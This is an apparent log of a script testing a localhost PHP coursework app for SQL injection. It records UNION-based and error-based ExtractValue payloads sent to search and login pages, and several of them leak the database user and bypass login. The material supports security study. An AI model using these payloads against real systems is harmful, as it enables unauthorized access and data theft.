Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find2.php?search=Apple HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find2.php - With params: {'search': 'Apple'}
Result is:  - Apple   2.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find.php?search=Apple HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find.php - With params: {'search': 'Apple'}
Result is:  - Apple   2.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find3.php?search=Apple HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find3.php - With params: {'search': 'Apple'}
Result is:  - Apple   2.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/search.php?search=Apple HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/search.php - With params: {'search': 'Apple'}
Result is:  - Apple   2.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login.php - With params: {'user': 'any', 'pass': 'password'}
Result is: Welcome admin!

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login3.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login3.php - With params: {'user': 'any', 'pass': 'password'}
Result is: Welcome admin!

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login2.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login2.php - With params: {'user': 'any', 'pass': 'password'}
Result is: Welcome admin!

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price3.php?max=100 HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price3.php - With params: {'max': 100}
Result is:  - 2.00 € <br/> - 3.00 € <br/> - 1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price4.php?max=100 HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price4.php - With params: {'max': 100}
Result is:  - Apple <br/> - Orange <br/> - Cherry <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price.php?max=100 HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price.php - With params: {'max': 100}
Result is:  - Apple   2.00 € <br/> - Orange   3.00 € <br/> - Cherry   1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price2.php?max=100 HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price2.php - With params: {'max': 100}
Result is:  - Apple   2.00 € <br/> - Orange   3.00 € <br/> - Cherry   1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find2.php?search=%27+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find2.php - With params: {'search': "' UNION ALL SELECT USER(),USER() -- - "}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find.php?search=%27+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find.php - With params: {'search': "' UNION ALL SELECT USER(),USER() -- - "}
Result is:  - root@172.17.0.1   root@172.17.0.1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find3.php?search=%27+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find3.php - With params: {'search': "' UNION ALL SELECT USER(),USER() -- - "}
Result is:  - root@172.17.0.1   root@172.17.0.1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/search.php?search=%27+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/search.php - With params: {'search': "' UNION ALL SELECT USER(),USER() -- - "}
Result is:  - Apple   2.00 € <br/> - Orange   3.00 € <br/> - Cherry   1.00 € <br/> - root@172.17.0.1   root@172.17.0.1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find2.php?search=%22+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find2.php - With params: {'search': '" UNION ALL SELECT USER(),USER() -- - '}
Result is:  - root@172.17.0.1   root@172.17.0.1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find.php?search=%22+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find.php - With params: {'search': '" UNION ALL SELECT USER(),USER() -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>24</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find3.php?search=%22+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find3.php - With params: {'search': '" UNION ALL SELECT USER(),USER() -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/search.php?search=%22+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/search.php - With params: {'search': '" UNION ALL SELECT USER(),USER() -- - '}
Result is: 

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find2.php?search=1+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find2.php - With params: {'search': '1 UNION ALL SELECT USER(),USER() -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find.php?search=1+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find.php - With params: {'search': '1 UNION ALL SELECT USER(),USER() -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>24</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find3.php?search=1+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find3.php - With params: {'search': '1 UNION ALL SELECT USER(),USER() -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/search.php?search=1+UNION+ALL+SELECT+USER%28%29%2CUSER%28%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/search.php - With params: {'search': '1 UNION ALL SELECT USER(),USER() -- - '}
Result is: 

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find2.php?search=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find2.php - With params: {'search': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find.php?search=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find.php - With params: {'search': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php:19
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php(19): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>19</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find3.php?search=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find3.php - With params: {'search': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/search.php?search=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/search.php - With params: {'search': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/search.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/search.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/search.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find2.php?search=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find2.php - With params: {'search': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find.php?search=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find.php - With params: {'search': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>24</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find3.php?search=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find3.php - With params: {'search': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/search.php?search=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/search.php - With params: {'search': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: 

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find2.php?search=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find2.php - With params: {'search': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find2.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find.php?search=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find.php - With params: {'search': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find.php</b> on line <b>24</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/find3.php?search=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/find3.php - With params: {'search': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/find/find3.php</b> on line <b>19</b><br />
 -    .00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /find/search.php?search=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/find/search.php - With params: {'search': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: 

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login.php - With params: {'user': 'any', 'pass': "' UNION ALL SELECT USER(),USER(),USER(),USER() -- - "}
Result is: Welcome root@172.17.0.1!

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login3.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login3.php - With params: {'user': 'any', 'pass': "' UNION ALL SELECT USER(),USER(),USER(),USER() -- - "}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login2.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login2.php - With params: {'user': 'any', 'pass': "' UNION ALL SELECT USER(),USER(),USER(),USER() -- - "}
Result is: Welcome root@172.17.0.1!

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login.php - With params: {'user': 'any', 'pass': '" UNION ALL SELECT USER(),USER(),USER(),USER() -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login3.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login3.php - With params: {'user': 'any', 'pass': '" UNION ALL SELECT USER(),USER(),USER(),USER() -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login2.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login2.php - With params: {'user': 'any', 'pass': '" UNION ALL SELECT USER(),USER(),USER(),USER() -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login.php - With params: {'user': 'any', 'pass': '1 UNION ALL SELECT USER(),USER(),USER(),USER() -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login3.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login3.php - With params: {'user': 'any', 'pass': '1 UNION ALL SELECT USER(),USER(),USER(),USER() -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login2.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login2.php - With params: {'user': 'any', 'pass': '1 UNION ALL SELECT USER(),USER(),USER(),USER() -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login.php - With params: {'user': 'any', 'pass': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/login/login.php:19
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/login/login.php(19): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/login/login.php</b> on line <b>19</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login3.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login3.php - With params: {'user': 'any', 'pass': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login2.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login2.php - With params: {'user': 'any', 'pass': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/login/login2.php:11
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/login/login2.php(11): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/login/login2.php</b> on line <b>11</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login.php - With params: {'user': 'any', 'pass': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login3.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login3.php - With params: {'user': 'any', 'pass': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login2.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login2.php - With params: {'user': 'any', 'pass': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login.php - With params: {'user': 'any', 'pass': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login3.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login3.php - With params: {'user': 'any', 'pass': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "POST /login/login2.php HTTP/1.1" 200 None
Sending request to: http://localhost:9000/login/login2.php - With params: {'user': 'any', 'pass': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: Wrong username or password

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price3.php?max=%27+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price3.php - With params: {'max': "' UNION ALL SELECT USER() AS name, USER() AS price -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php:20
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php(20): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php</b> on line <b>20</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price4.php?max=%27+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price4.php - With params: {'max': "' UNION ALL SELECT USER() AS name, USER() AS price -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price.php?max=%27+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price.php - With params: {'max': "' UNION ALL SELECT USER() AS name, USER() AS price -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price2.php?max=%27+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price2.php - With params: {'max': "' UNION ALL SELECT USER() AS name, USER() AS price -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price3.php?max=%22+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price3.php - With params: {'max': '" UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot; UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php:20
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php(20): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php</b> on line <b>20</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price4.php?max=%22+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price4.php - With params: {'max': '" UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot; UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price.php?max=%22+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price.php - With params: {'max': '" UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot; UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price2.php?max=%22+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price2.php - With params: {'max': '" UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\&quot; UNION ALL SELECT USER() AS name, USER() AS price -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
